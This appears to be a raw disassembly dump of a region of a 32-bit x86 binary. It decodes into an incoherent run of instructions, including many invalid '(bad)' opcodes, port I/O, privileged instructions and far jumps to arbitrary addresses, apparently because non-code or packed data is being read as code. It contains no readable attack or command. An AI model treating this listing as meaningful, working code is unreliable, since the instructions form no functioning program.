  413ca1:	sar    DWORD PTR [edx-0x621ef162],0x2c
  413ca8:	cli    
  413ca9:	daa    
  413caa:	sbb    al,0x27
  413cac:	lahf   
  413cad:	mov    esp,0x82b479b2
  413cb2:	addr16 mov ecx,0xc073206d
  413cb8:	dec    esp
  413cb9:	int    0xfe
  413cbb:	mov    bl,0xf
  413cbd:	push   ss
  413cbe:	jge    0x413d00
  413cc0:	xchg   ebx,eax
  413cc1:	daa    
  413cc2:	sub    BYTE PTR [ebx],0xae
  413cc5:	mov    esi,DWORD PTR [edi]
  413cc7:	ins    BYTE PTR es:[edi],dx
  413cc8:	xor    eax,0xd37b980d
  413ccd:	jb     0x413cd3
  413ccf:	sti    
  413cd0:	fs jnp 0x413d1b
  413cd3:	in     eax,dx
  413cd4:	add    al,dl
  413cd6:	sub    al,0x81
  413cd8:	(bad)  
  413cd9:	or     ecx,DWORD PTR [edx-0x35f96633]
  413cdf:	aad    0x3e
  413ce1:	aaa    
  413ce2:	mov    WORD PTR [eax],cs
  413ce4:	or     ah,BYTE PTR [esi-0x18]
  413ce7:	mov    cl,0x89
  413ce9:	imul   BYTE PTR [ecx]
  413ceb:	lea    ebx,[ecx-0x5d]
  413cee:	rcl    esp,cl
  413cf0:	retf   0x31d9
  413cf3:	sub    ah,0xdf
  413cf6:	adc    ebp,DWORD PTR [edx+0x45]
  413cf9:	int    0x3e
  413cfb:	outs   dx,BYTE PTR ds:[esi]
  413cfc:	clc    
  413cfd:	ss add eax,0xc3ddfe70
  413d03:	jmp    0x413cb6
  413d05:	arpl   WORD PTR [esi-0x34],di
  413d08:	test   BYTE PTR [edx*2-0xeed7bbf],0x1
  413d10:	or     BYTE PTR [ecx+0x6b05c4f2],dh
  413d16:	inc    ebx
  413d17:	jmp    0x9921:0xc45e1efd
  413d1e:	(bad)  
  413d1f:	out    dx,eax
  413d20:	mov    eax,ds:0x21dc1ebc
  413d25:	pop    edi
  413d26:	sub    ah,BYTE PTR [esi]
  413d28:	arpl   WORD PTR [ebx-0x57],bp
  413d2b:	push   0xffffffe6
  413d2d:	scas   al,BYTE PTR es:[edi]
  413d2e:	iret   
  413d2f:	xchg   ebx,eax
  413d30:	and    ch,bl
  413d32:	mov    eax,ds:0xbcc8241e
  413d37:	xchg   edi,eax
  413d38:	rol    BYTE PTR [eax+0x61],0x2e
  413d3c:	cmp    edi,ecx
  413d3e:	xor    DWORD PTR [esi],edx
  413d40:	jg     0x413cec
  413d42:	(bad)  
  413d43:	xchg   ebp,eax
  413d44:	stos   DWORD PTR es:[edi],eax
  413d45:	push   ebp
  413d46:	iret   
  413d47:	dec    esi
  413d48:	pusha  
  413d49:	ror    bl,cl
  413d4b:	(bad)  
  413d4c:	gs mov dh,0x2c
  413d4f:	(bad)  [esi]
  413d51:	fist   WORD PTR [edx]
  413d53:	add    BYTE PTR [ecx],dl
  413d55:	jnp    0x413d91
  413d57:	jns    0x413ced
  413d59:	cmp    BYTE PTR [ecx],bl
  413d5b:	pop    esi
  413d5c:	mov    eax,ds:0x95363848
  413d61:	dec    eax
  413d62:	(bad)  
  413d63:	pusha  
  413d64:	pop    ebx
  413d65:	repnz lods al,BYTE PTR ds:[esi]
  413d67:	cmp    edi,DWORD PTR [edx]
  413d69:	or     esi,ecx
  413d6b:	std    
  413d6c:	std    
  413d6d:	xchg   edx,eax
  413d6e:	adc    dl,0xc3
  413d71:	jecxz  0x413d5d
  413d73:	or     al,0xe3
  413d75:	mov    fs:0x5fe39fa1,al
  413d7b:	enter  0x4618,0xb0
  413d7f:	(bad)  
  413d80:	and    eax,0x1b4b309a
  413d85:	pop    ebp
  413d86:	bound  esp,QWORD PTR [ebx+edi*4-0x4b]
  413d8a:	std    
  413d8b:	in     al,0x1e
  413d8d:	and    esp,DWORD PTR [esi+0x22]
  413d90:	dec    edi
  413d91:	int3   
  413d92:	sbb    DWORD PTR [ebp-0x19],esp
  413d95:	and    dl,bl
  413d97:	inc    edi
  413d99:	das    
  413d9a:	mov    DWORD PTR [ebx-0x52],eax
  413d9d:	pop    esi
  413d9e:	mov    eax,0x59ceb219
  413da3:	xchg   edi,eax
  413da4:	pop    eax
  413da5:	pop    ebx
  413da6:	sbb    DWORD PTR [ebx],ebx
  413da8:	fistp  QWORD PTR [ebx+0x17]
  413dab:	outs   dx,DWORD PTR ds:[esi]
  413dac:	pop    es
  413dad:	and    DWORD PTR [ebx+0x2e],0xffffff86
  413db1:	mov    cl,0x12
  413db3:	sbb    al,0x5d
  413db5:	icebp  
  413db6:	jg     0x413d49
  413db8:	xor    al,0x92
  413dba:	(bad)  
  413dbb:	repnz push 0xfa6d2dd2
  413dc1:	pop    ebp
  413dc2:	aas    
  413dc3:	outs   dx,DWORD PTR ds:[esi]
  413dc4:	sub    eax,DWORD PTR [edx*4+0x105408fd]
  413dcb:	adc    bl,ch
  413dcd:	xor    al,0xa1
  413dcf:	outs   dx,DWORD PTR ds:[esi]
  413dd0:	iret   
  413dd1:	pop    esp
  413dd2:	out    0xf8,eax
  413dd4:	arpl   WORD PTR es:[eax-0x6ad8880],bx
  413ddb:	popa   
  413ddc:	xor    BYTE PTR [edx],dl
  413dde:	adc    esi,ebx
  413de0:	xor    ebx,ebx
  413de2:	push   cs
  413de3:	or     dl,BYTE PTR [ecx-0x6f]
  413de6:	imul   ch
  413de8:	xor    BYTE PTR [esi-0x2ecfc95c],cl
  413dee:	jle    0x413e4f
  413df0:	mov    edi,0x8a4191a8
  413df5:	sbb    DWORD PTR [edx],eax
  413df7:	xchg   ebx,eax
  413df8:	mov    ch,0xad
  413dfa:	push   edx
  413dfb:	dec    ebx
  413dfc:	imul   ebx,ebp,0xffffff9a
  413dff:	sub    DWORD PTR [edx+0x46cfab5d],eax
  413e05:	mov    ah,0xa0
  413e07:	pop    esp
  413e08:	ds mov ch,0x92
  413e0b:	ja     0x413dfc
  413e0d:	adc    DWORD PTR [edi+0x36601a83],edx
  413e13:	adc    eax,0xb21fb6c6
  413e18:	mov    WORD PTR [ebp+0x46b6cb8d],?
  413e1e:	pop    ebp
  413e1f:	test   bh,ah
  413e21:	dec    DWORD PTR [ebp+0x3849a393]
  413e27:	sbb    al,0x7c
  413e29:	sbb    eax,DWORD PTR [edx+0x5d]
  413e2c:	nop
  413e2d:	adc    cl,BYTE PTR [ebp-0x5d54af27]
  413e33:	addr16 inc ebx
  413e35:	ficomp WORD PTR [esi+0x49]
  413e38:	(bad)  
  413e3a:	cmp    DWORD PTR [edi-0x6bd63b76],eax
  413e40:	push   0x36
  413e42:	and    DWORD PTR [esi+0x78],ebx
  413e45:	fdiv   DWORD PTR [ecx+edi*4+0x7cb2654]
  413e4c:	push   DWORD PTR [edx+0x7858a6d1]
  413e52:	mov    WORD PTR ds:0x2debdcd0,gs
  413e58:	or     BYTE PTR [edx],0xfb
  413e5b:	sbb    cl,BYTE PTR [esi]
  413e5d:	mov    edi,0x907b478d
  413e62:	outs   dx,BYTE PTR ds:[esi]
  413e63:	mov    edx,0x4c702e45
  413e68:	bound  edi,QWORD PTR [ebp+0x7bea5e08]
  413e6e:	push   esp
  413e6f:	test   bh,bh
  413e71:	or     al,0x8b
  413e73:	test   DWORD PTR [ecx+edi*8],ecx
  413e76:	into   
  413e77:	out    0x5a,al
  413e79:	add    eax,0x7d1d160a
  413e7e:	hlt    
  413e7f:	jne    0x413e78
  413e81:	mov    eax,DWORD PTR [ecx]
  413e83:	xchg   esp,eax
  413e84:	into   
  413e85:	(bad)  
  413e86:	push   0xbd32d33d
  413e8b:	xor    eax,0x767abc58
  413e90:	add    DWORD PTR [esp+esi*1+0x5f3a8ded],0x111a8af9
  413e9b:	mov    al,0x51
  413e9d:	adc    al,0x99
  413e9f:	inc    esp
  413ea0:	jne    0x413e54
  413ea2:	push   eax
  413ea3:	cmp    DWORD PTR [edx+0xd],ecx
  413ea6:	int3   
  413ea7:	sbb    ch,dl
  413ea9:	dec    edx
  413eaa:	jmp    0x8745cb17
  413eaf:	out    0x72,eax
  413eb1:	xlat   BYTE PTR ds:[ebx]
  413eb2:	cdq    
  413eb3:	jmp    0x946fb2e9
  413eb8:	pusha  
  413eb9:	jge    0x413e6c
  413ebb:	xlat   BYTE PTR ds:[ebx]
  413ebc:	add    al,0xad
  413ebe:	aad    0x9
  413ec0:	lock add DWORD PTR gs:[edi-0x12e73711],eax
  413ec8:	add    al,0x56
  413eca:	bound  edx,QWORD PTR [edi]
  413ecc:	or     BYTE PTR [eax+0x3],cl
  413ecf:	mov    dh,0xb
  413ed1:	sahf   
  413ed2:	mov    BYTE PTR [eax-0x188de526],cl
  413ed8:	push   eax
  413ed9:	ja     0x413eed
  413edb:	cmc    
  413edc:	push   esp
  413edd:	repnz sbb cl,bl
  413ee0:	sar    DWORD PTR [ebp+0x1f],cl
  413ee3:	mov    al,0xf9
  413ee5:	scas   eax,DWORD PTR es:[edi]
  413ee6:	cmp    ecx,0x19ff4dc4
  413eec:	retf   
  413eed:	mov    DWORD PTR [ebx+0x2a],0x6db79fbf
  413ef4:	das    
  413ef5:	lods   eax,DWORD PTR ds:[esi]
  413ef6:	pusha  
  413ef7:	or     ah,BYTE PTR [edx+ecx*4-0x504ff44e]
  413efe:	(bad)  
  413eff:	xchg   ebp,eax
  413f00:	into   
  413f01:	jle    0x413e8d
  413f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f04:	adc    BYTE PTR [ebp+0x291545b9],ch
  413f0a:	out    dx,eax
  413f0b:	(bad)  
  413f0c:	(bad)  ds:0x45d1efb7
  413f12:	enter  0xb8e2,0x94
  413f16:	push   ebp
  413f17:	sbb    DWORD PTR [edx+0xf936a0b],esi
  413f1d:	mov    DWORD PTR [eax+ebp*8-0x4a53e175],esi
  413f24:	aaa    
  413f25:	push   esp
  413f26:	sahf   
  413f27:	rcl    BYTE PTR [edi-0x47],0x96
  413f2b:	loopne 0x413f04
  413f2d:	push   cs
  413f2e:	clc    
  413f2f:	and    eax,0x30351724
  413f34:	retf   0xd5a7
  413f37:	mov    cl,0x16
  413f39:	outs   dx,DWORD PTR ds:[esi]
  413f3a:	leave  
  413f3b:	idiv   dl
  413f3d:	aam    0xd1
  413f3f:	aas    
  413f40:	mov    bl,BYTE PTR [ecx+eiz*2+0x37]
  413f44:	fdiv   DWORD PTR [edx-0x49575b41]
  413f4a:	mov    ?,WORD PTR [edi+esi*4]
  413f4d:	iret   
  413f4e:	clc    
  413f4f:	jne    0x413f61
  413f51:	push   ebx
  413f52:	mov    dh,0xc3
  413f54:	xchg   edi,eax
  413f55:	push   ebp
  413f56:	sub    BYTE PTR [eax+0x5c],cl
  413f59:	fisubr DWORD PTR [edi-0x53]
  413f5c:	retf   0xa8ee
  413f5f:	sub    al,0xec
  413f61:	pop    edx
  413f62:	jmp    0x1651f37a
  413f67:	scas   al,BYTE PTR es:[edi]
  413f68:	cli    
  413f69:	xchg   edi,eax
  413f6a:	popf   
  413f6b:	and    ah,dl
  413f6d:	lds    ecx,FWORD PTR [eax]
  413f6f:	imul   edx,DWORD PTR [ecx-0x4e5a14a9],0xffffff98
  413f76:	fisttp QWORD PTR [edx+0x49]
  413f79:	pop    eax
  413f7a:	mov    al,ds:0x9db47087
  413f7f:	xchg   BYTE PTR [edx+0x6eca673],dl
  413f85:	jle    0x413f11
  413f87:	icebp  
  413f88:	inc    esi
  413f89:	cli    
  413f8a:	daa    
  413f8b:	mov    al,ds:0x91166678
  413f90:	jecxz  0x413fd9
  413f92:	(bad)  
  413f93:	inc    ebp
  413f94:	sbb    esp,ecx
  413f96:	pop    edx
  413f97:	xchg   esi,eax
  413f98:	sbb    al,0x7c
  413f9a:	rol    eax,cl
  413f9c:	cwde   
  413f9d:	xchg   edi,eax
  413f9e:	cmp    eax,0x124e6c4a
  413fa3:	out    0x57,al
  413fa5:	rol    dl,cl
  413fa7:	and    al,BYTE PTR [edx]
  413fa9:	shl    BYTE PTR [esp+edi*2+0x4a],cl
  413fad:	ss pop ebx
  413faf:	inc    edx
  413fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fb1:	mov    bh,0xc2
  413fb3:	jl     0x413f54
  413fb5:	jl     0x413fff
  413fb7:	mov    bh,0xe9
  413fb9:	aad    0xa5
  413fbb:	xchg   edx,eax
  413fbc:	mov    dl,0xe8
  413fbe:	enter  0x306d,0x42
  413fc2:	push   es
  413fc3:	sub    DWORD PTR [ebp-0x4107910a],ecx
  413fc9:	(bad)  
  413fca:	pop    esi
  413fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fcc:	rcl    ebx,cl
  413fce:	mov    edi,0xcff09754
  413fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd4:	xchg   ebp,eax
  413fd5:	int    0xfc
  413fd7:	push   ebp
  413fd8:	add    DWORD PTR [eax-0x11],edx
  413fdb:	imul   esi,DWORD PTR [edx],0xfffffff7
  413fde:	paddb  mm2,QWORD PTR [edi+0x15]
  413fe2:	sub    DWORD PTR [ebp+ecx*1-0x70],ebx
  413fe6:	mov    esp,DWORD PTR [edi-0x35]
  413fe9:	xchg   ecx,eax
  413fea:	or     ecx,DWORD PTR [ebx]
  413fec:	push   0xffffffe8
  413fee:	adc    eax,0x1e12d0b0
  413ff3:	out    0xc,eax
  413ff5:	add    al,0x7f
  413ff7:	mov    edx,DWORD PTR [ebx]
  413ff9:	ds push ebx
  413ffb:	mov    esi,0x53d8b35a
  414000:	int3   
  414001:	fcom   QWORD PTR [eax]
  414003:	sub    BYTE PTR [ebp+esi*4+0x45],cl
  414007:	in     al,dx
  414008:	not    BYTE PTR [edx-0x7d]
  41400b:	test   DWORD PTR [esi+0x292f7c87],ecx
  414011:	call   0x788dff15
  414016:	fsub   QWORD PTR [eax-0x62]
  414019:	and    ecx,DWORD PTR [ebp-0x28]
  41401c:	mov    esi,0xa8ac44ca
  414021:	or     BYTE PTR ds:0x3f19fe7e,ah
  414027:	dec    esp
  414028:	jae    0x414038
  41402a:	(bad)  
  41402b:	and    al,0xcd
  41402d:	cwde   
  41402e:	push   ecx
  41402f:	dec    ebx
  414030:	sbb    esp,DWORD PTR [eax+eiz*2-0x7885be23]
  414037:	or     dh,BYTE PTR [esi*1-0x78467d74]
  41403e:	add    esp,DWORD PTR [si]
  414041:	xchg   ebx,eax
  414042:	scas   eax,DWORD PTR es:[edi]
  414043:	sbb    al,0xa9
  414045:	sbb    esp,esp
  414047:	out    dx,al
  414048:	jo     0x413fd8
  41404a:	xor    ebp,esi
  41404c:	in     ax,0xaa
  41404f:	ret    
  414050:	div    esi
  414052:	xchg   al,dl
  414054:	xchg   edx,eax
  414055:	pop    esp
  414056:	lds    eax,FWORD PTR [ebx+0x8]
  414059:	xchg   ebx,eax
  41405a:	and    esp,esi
  41405c:	pop    edi
  41405d:	lea    edi,[ebp-0x1c]
  414060:	xchg   DWORD PTR [ecx-0x193b3beb],ebx
  414066:	dec    ecx
  414067:	lods   al,BYTE PTR ds:[esi]
  414068:	mov    WORD PTR [eax+ebp*4+0x1e7f8a6b],gs
  41406f:	xchg   ecx,eax
  414070:	out    0x84,eax
  414072:	fwait
  414073:	ret    0x95e6
  414076:	mov    ebx,0x51d27105
  41407b:	popf   
  41407c:	mov    fs,WORD PTR [ebx+0x119fcd24]
  414082:	jno    0x41400f
  414084:	ret    
  414085:	outs   dx,DWORD PTR ds:[esi]
  414086:	jns    0x41402f
  414088:	call   FWORD PTR [ecx-0x55dd8803]
  41408e:	inc    ecx
  41408f:	hlt    
  414090:	test   ebx,0xbf937c67
  414096:	gs in  eax,dx
  414098:	enter  0xe727,0x4
  41409c:	fwait
  41409d:	push   esp
  41409e:	inc    esi
  41409f:	mov    bh,0x50
  4140a1:	sar    DWORD PTR [edi+0x2c2c061f],cl
  4140a7:	push   esi
  4140a8:	dec    esi
  4140a9:	inc    edx
  4140aa:	mov    dl,BYTE PTR [ebp+eax*8+0x85fa1ae]
  4140b1:	and    DWORD PTR [eax+0x6e42b08d],edi
  4140b7:	sbb    bh,ch
  4140b9:	pop    esi
  4140ba:	test   DWORD PTR [esi-0x2e],ebp
  4140bd:	add    bl,BYTE PTR [ebx+ebp*4]
  4140c0:	cmp    eax,0xe0f80237
  4140c5:	jnp    0x414075
  4140c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140c8:	sbb    DWORD PTR [ebx+ebx*4-0x5a],edx
  4140cc:	dec    ecx
  4140cd:	and    DWORD PTR [ebx],eax
  4140cf:	push   0x0
  4140d1:	dec    edx
  4140d2:	push   cs
  4140d3:	aaa    
  4140d4:	push   esp
  4140d5:	push   edx
  4140d6:	jbe    0x4140ca
  4140d8:	das    
  4140d9:	pop    ss
  4140da:	push   cs
  4140db:	dec    esp
  4140dc:	aas    
  4140dd:	mov    esi,0xa6ff4ffe
  4140e2:	test   BYTE PTR [ecx-0x4b],0x8e
  4140e6:	jle    0x4140e2
  4140e8:	fnstenv [edx+0x757ea7d9]
  4140ee:	(bad)  
  4140ef:	and    al,0xa
  4140f1:	or     cl,BYTE PTR [esi]
  4140f3:	dec    edi
  4140f4:	jo     0x4140ee
  4140f6:	push   0xfffffff2
  4140f8:	fs loopne 0x4140a8
  4140fb:	sti    
  4140fc:	fistp  DWORD PTR [edx-0x78604d55]
  414102:	mov    eax,ds:0x8bfd0b5d
  414107:	sbb    eax,0x91c7be89
  41410c:	dec    esi
  41410d:	mov    ecx,0x93c6dbec
  414112:	into   
  414113:	inc    esp
  414114:	idiv   cl
  414116:	mov    ebp,DWORD PTR [eax+0x1]
  414119:	mov    ebx,0x792d71aa
  41411e:	inc    edx
  41411f:	adc    dh,dh
  414121:	fucomp st(7)
  414123:	xchg   edi,eax
  414124:	and    eax,0x60642060
  414129:	and    al,0x6c
  41412b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412c:	je     0x414106
  41412e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412f:	mov    ebx,0x5ac592e3
  414134:	dec    edi
  414135:	jmp    0xc8c4:0x559adef8
  41413c:	push   esp
  41413d:	mov    al,0xd7
  41413f:	nop
  414140:	pop    eax
  414141:	or     al,0xcc
  414143:	hlt    
  414144:	push   edx
  414145:	lahf   
  414146:	pop    esp
  414147:	cmp    dh,ah
  414149:	(bad)  
  41414a:	xchg   ebp,eax
  41414b:	sub    ebx,DWORD PTR [ebp+0x46]
  41414e:	ja     0x414141
  414150:	jmp    0x9111:0x6d6d6e86
  414157:	test   DWORD PTR [edx+edx*1+0x2c],ebp
  41415b:	in     eax,0x53
  41415d:	(bad)  
  41415e:	mov    al,ds:0x734eddac
  414163:	stc    
  414164:	(bad)  
  414165:	pusha  
  414166:	mov    dh,0xdf
  414168:	stc    
  414169:	adc    ebx,DWORD PTR [ebx]
  41416b:	mov    BYTE PTR [ecx-0x22],bh
  41416e:	nop
  41416f:	out    dx,al
  414170:	dec    esi
  414171:	mov    WORD PTR [ebx+0x2e360bc2],ss
  414177:	or     eax,0xcfc76019
  41417c:	pop    eax
  41417d:	aas    
  41417e:	add    bl,BYTE PTR [eax+0x56d3c4e7]
  414184:	inc    edi
  414185:	test   eax,0xa13506dd
  41418a:	cli    
  41418b:	nop
  41418c:	push   ss
  41418d:	in     al,0x2e
  41418f:	rol    cl,cl
  414191:	mov    edi,0x76514d64
  414196:	xchg   edi,eax
  414197:	add    DWORD PTR [ebp+0x68],0x4d7574cd
  41419e:	retf   
  41419f:	aad    0x68
  4141a1:	add    DWORD PTR [ebp+0x60],edi
  4141a4:	mov    al,BYTE PTR [ecx+eiz*8-0x7f79a6e1]
  4141ab:	xchg   DWORD PTR [edi+eax*4],esi
  4141ae:	jg     0x4141f3
  4141b0:	je     0x414225
  4141b2:	aad    0x8f
  4141b4:	mov    eax,0x6b032895
  4141b9:	mov    edi,0x38435877
  4141be:	in     eax,0xb8
  4141c0:	gs jns 0x4141d4
  4141c3:	pop    edx
  4141c4:	shl    al,0xfd
  4141c7:	repz inc ecx
  4141c9:	xlat   BYTE PTR ds:[ebx]
  4141ca:	cmovne esp,DWORD PTR [ecx]
  4141cd:	add    DWORD PTR [ebx-0xb513e27],edx
  4141d3:	jle    0x4141a7
  4141d5:	mov    ds:0x3aa14c58,al
  4141da:	cwde   
  4141db:	sub    eax,ecx
  4141dd:	dec    ebx
  4141de:	mov    eax,ds:0xaff6bc38
  4141e3:	imul   ebp,DWORD PTR [ecx],0x5
  4141e6:	add    eax,0xad97faf1
  4141eb:	fldcw  WORD PTR [eax+0x3ecb4ebb]
  4141f1:	and    eax,0x3fd2f885
  4141f6:	lock xchg ecx,eax
  4141f8:	jae    0x414268
  4141fa:	aas    
  4141fb:	lea    esi,[ebp-0x7]
  4141fe:	jns    0x4141b7
  414200:	mov    ds:0x748e406a,al
  414205:	jle    0x41422b
  414207:	xor    dl,ah
  414209:	push   esi
  41420a:	sbb    eax,0x6891838b
  41420f:	icebp  
  414210:	mov    bh,bh
  414212:	aaa    
  414213:	jno    0x414254
  414215:	mul    BYTE PTR [ebx-0x6f]
  414218:	stos   BYTE PTR es:[edi],al
  414219:	ret    0x777b
  41421c:	dec    esi
  41421d:	dec    BYTE PTR [edx+0x2ffa9ee4]
  414223:	inc    edx
  414224:	out    0xa7,al
  414226:	mov    ecx,0x9849adcf
  41422b:	into   
  41422c:	pop    es
  41422d:	ret    0xca81
  414230:	add    ch,BYTE PTR [ebx+0x22]
  414233:	js     0x41425d
  414235:	mov    ebx,es
  414237:	add    al,0x94
  414239:	cwde   
  41423a:	mul    DWORD PTR [eax-0x4f]
  41423d:	ret    0x2c1c
  414240:	mov    ch,BYTE PTR ds:0x631de3f
  414246:	mov    ch,BYTE PTR [edx]
  414248:	aaa    
  414249:	dec    ebp
  41424a:	mov    edi,0xa6ebac32
  41424f:	jnp    0x4142c2
  414251:	push   edx
  414252:	xor    BYTE PTR [eax],bh
  414254:	int    0xd0
  414256:	mov    dl,0x74
  414258:	inc    edx
  414259:	loope  0x414233
  41425b:	in     al,dx
  41425c:	inc    esi
  41425d:	mov    cl,0x77
  41425f:	mov    dh,BYTE PTR [edi+edx*8]
  414262:	jmp    0xca7be534
  414267:	je     0x41421b
  414269:	mov    esi,0x70d37c89
  41426e:	clc    
  41426f:	sub    al,0xb2
  414271:	bound  edx,QWORD PTR [ecx]
  414273:	or     edx,esp
  414275:	stc    
  414276:	mov    ds:0xfdab0ede,eax
  41427b:	vcmppd xmm1,xmm2,XMMWORD PTR [edi],0x35
  414280:	(bad)  
  414281:	mov    cl,0xd3
  414283:	push   DWORD PTR [ebx]
  414285:	push   ecx
  414286:	idiv   BYTE PTR [esi-0x61]
  414289:	xchg   ecx,eax
  41428a:	mov    ebx,0x6bcd8fd1
  41428f:	cmp    BYTE PTR [edi],dl
  414291:	sbb    al,0x56
  414293:	fnstcw WORD PTR [edx+0x202b6289]
  414299:	dec    eax
  41429a:	scas   eax,DWORD PTR es:[edi]
  41429b:	js     0x4142c9
  41429d:	mov    BYTE PTR [edx-0x59a9014b],al
  4142a3:	push   eax
  4142a4:	(bad)
  4142a7:	fidivr WORD PTR [ecx+0x2f7671ba]
  4142ad:	or     DWORD PTR [ecx-0x57],0x2d9853a6
  4142b4:	mov    esi,0x310a0470
  4142b9:	mov    ecx,0xe9fc01a1
  4142be:	jg     0x4142f5
  4142c0:	add    BYTE PTR [eax-0x72f4a809],al
  4142c6:	cmp    al,0x9d
  4142c8:	jmp    0xfa6a:0xbb911a39
  4142cf:	xor    esp,DWORD PTR [esi+0xe]
  4142d2:	xchg   esp,eax
  4142d3:	out    0xfe,eax
  4142d5:	stc    
  4142d6:	fisubr WORD PTR [ebx+0x48]
  4142d9:	rcl    al,0x54
  4142dc:	cdq    
  4142dd:	jae    0x4142db
  4142df:	mov    ds:0x1c82410d,eax
  4142e4:	push   0x28
  4142e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e7:	pop    esp
  4142e8:	pop    ebp
  4142e9:	ins    BYTE PTR es:[edi],dx
  4142ea:	in     eax,0xbb
  4142ec:	jmp    0x41427a
  4142ee:	dec    ebp
  4142ef:	inc    eax
  4142f0:	(bad)  
  4142f1:	dec    edi
  4142f2:	aaa    
  4142f3:	xchg   ebp,eax
  4142f4:	adc    BYTE PTR [ecx-0x3b2e1113],ah
  4142fa:	push   0xffffffe8
  4142fc:	shl    DWORD PTR [ecx+edi*4-0x1e],cl
  414300:	cmp    ebx,edi
  414302:	xchg   ah,cl
  414304:	adc    al,0xe2
  414306:	pop    ss
  414307:	inc    ebx
  414308:	iret   
  414309:	int    0x0
  41430b:	scas   al,BYTE PTR es:[edi]
  41430c:	loop   0x4142e9
  41430e:	cmc    
  41430f:	in     al,dx
  414310:	pusha  
  414311:	test   al,0x31
  414313:	scas   eax,DWORD PTR es:[edi]
  414314:	mov    ch,0x2a
  414316:	xor    DWORD PTR [eax-0x50699463],ebp
  41431c:	or     al,0xfa
  41431e:	aas    
  41431f:	mov    al,ds:0x4043d2c9
  414324:	in     al,0x23
  414326:	out    0x73,eax
  414328:	mov    eax,ds:0xdf66fc47
  41432d:	mov    ecx,0xec4803a4
  414332:	in     eax,dx
  414333:	push   ds
  414334:	hlt    
  414335:	jno    0x41432d
  414337:	dec    esp
  414338:	or     eax,0x5b554d34
  41433d:	pop    ds
  41433e:	jp     0x4143ad
  414340:	je     0x414318
  414342:	and    ah,BYTE PTR [ebx-0x63f09896]
  414348:	in     al,dx
  414349:	dec    ecx
  41434a:	dec    edi
  41434b:	pop    ebx
  41434c:	aas    
  41434d:	mov    eax,0xa4b969da
  414352:	loopne 0x414357
  414354:	(bad)  
  414355:	cmp    bh,BYTE PTR [ecx]
  414357:	push   ebp
  414358:	lahf   
  414359:	pop    eax
  41435a:	mov    ebx,0x2271d906
  41435f:	xor    al,0x76
  414361:	fs shr edi,0x22
  414365:	adc    al,BYTE PTR [edi+0x49]
  414368:	sysenter 
  41436a:	inc    eax
  41436b:	aam    0xd4
  41436d:	push   esp
  41436e:	fadd   st,st(4)
  414370:	icebp  
  414371:	mov    edx,0xe76453f8
  414376:	jge    0x41435d
  414378:	cmp    bh,BYTE PTR [esi+eax*1]
  41437b:	push   esp
  41437c:	clc    
  41437d:	addr16 das 
  41437f:	mov    ch,0x30
  414381:	loopne 0x4143a3
  414383:	gs jb  0x41438b
  414386:	sbb    bl,0x25
  414389:	lss    edx,FWORD PTR [ecx+0x23]
  41438d:	or     DWORD PTR [edi-0x18],0x38543e90
  414394:	xchg   esp,eax
  414395:	jmp    0x4143e0
  414397:	stc    
  414398:	add    edi,ecx
  41439a:	div    BYTE PTR [eax+0x69]
  41439d:	jno    0x4143f4
  41439f:	jecxz  0x414369
  4143a1:	mov    esp,0x55020f1f
  4143a6:	leave  
  4143a7:	in     al,dx
  4143a8:	pop    eax
  4143a9:	sub    BYTE PTR [ebp-0x4984738b],cl
  4143af:	outs   dx,BYTE PTR ds:[esi]
  4143b0:	fdivr  DWORD PTR [ebp-0x81d2d30]
  4143b6:	inc    ebp
  4143b7:	mov    ebp,0xc6ee05a
  4143bc:	xchg   edi,eax
  4143bd:	cmc    
  4143be:	cli    
  4143bf:	adc    BYTE PTR [esi+eax*8+0x15],ah
  4143c3:	or     esp,DWORD PTR [ebx+0x49]
  4143c6:	pop    ebx
  4143c7:	sub    esi,eax
  4143c9:	mul    BYTE PTR [esi+0x1001b873]
  4143cf:	mov    ds:0xc411f774,al
  4143d4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143d6:	xchg   edi,eax
  4143d7:	cmp    eax,0xaf848482
  4143dc:	je     0x41440d
  4143de:	xchg   edi,eax
  4143df:	es fsub st,st(5)
  4143e2:	mov    eax,ds:0x184ff195
  4143e7:	pushf  
  4143e8:	mov    dh,0x1b
  4143ea:	ret    0x16f1
  4143ed:	scas   al,BYTE PTR es:[edi]
  4143ee:	fwait
  4143ef:	mov    dl,0x9c
  4143f1:	inc    esp
  4143f2:	fistp  QWORD PTR [edi]
  4143f4:	mov    eax,ds:0x1c91d52d
  4143f9:	shl    BYTE PTR [ecx+0x632ff051],1
  4143ff:	in     al,dx
  414400:	or     DWORD PTR [eax+0x10],esp
  414403:	cwde   
  414404:	(bad)  
  414405:	mov    al,0x32
  414407:	imul   ebp,DWORD PTR [edi+0x2c],0xffffffb8
  41440b:	mov    DWORD PTR [edi-0x35],ecx
  41440e:	push   ss
  41440f:	inc    ecx
  414410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414411:	mov    al,ds:0x4747b7f3
  414416:	xchg   ebx,eax
  414417:	pop    edx
  414418:	pop    edi
  414419:	arpl   WORD PTR [edi+eiz*4-0x1b],bx
  41441d:	jl     0x4143c2
  41441f:	addr16 sub ecx,eax
  414422:	mov    esi,0x5f31100
  414427:	out    dx,eax
  414428:	jb     0x4144a8
  41442a:	mov    ecx,edi
  41442c:	push   edi
  41442d:	jg     0x41440c
  41442f:	push   ebp
  414430:	cmp    al,0x41
  414432:	out    0x2c,al
  414434:	in     al,0x4c
  414436:	ret    0xb47a
  414439:	shr    DWORD PTR [esi+0x38bd3e1d],1
  41443f:	sub    DWORD PTR [ebx],eax
  414441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414442:	sbb    al,0xe5
  414444:	push   esp
  414445:	cmc    
  414446:	aaa    
  414447:	and    eax,DWORD PTR [ecx-0x52671a3d]
  41444d:	clc    
  41444e:	xchg   edx,eax
  41444f:	inc    esp
  414450:	jl     0x41445d
  414452:	lea    edx,[ebx-0x27]
  414455:	sbb    bl,dl
  414457:	pop    ebx
  414458:	cdq    
  414459:	xchg   BYTE PTR [esi+0x57ad7b87],dh
  41445f:	cld    
  414460:	lahf   
